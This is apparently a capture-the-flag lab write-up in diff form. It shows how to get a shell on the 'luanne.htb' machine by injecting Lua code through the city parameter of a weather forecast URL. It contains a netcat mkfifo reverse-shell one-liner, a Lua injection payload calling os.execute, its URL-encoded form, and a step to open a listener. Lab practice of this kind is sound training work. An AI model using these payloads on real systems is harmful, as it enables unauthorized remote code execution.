@@ -1,0 +1,26 @@
+first we need os , to search paylaod to execute in the http://luanne.htb/weather/forecast?city=payload
+
+
+form nmap os: NetBSD
+now go to : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+for revesre shell single line payload command, go into netcat openbsd you find:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+
+
+now we have the payload , now for executing thsi command we need syntex so , 
+simply go in GFTObins and search for lua you will get the syntex:
+lua -e 'os.execute("/bin/sh")'
+we will use:this part:
+'os.execute("/bin/sh")'
+
+get the material now start making payload:
+
+');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f")--
+
+now by using an online urlencoder encode this in url language:
+  
+get the encode : 
+%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.21%201234%20%3E%2Ftmp%2Ff%22%29--
+
+now replace this with the payload in the url given at the top line
+ and also open a netcat session on port 1234
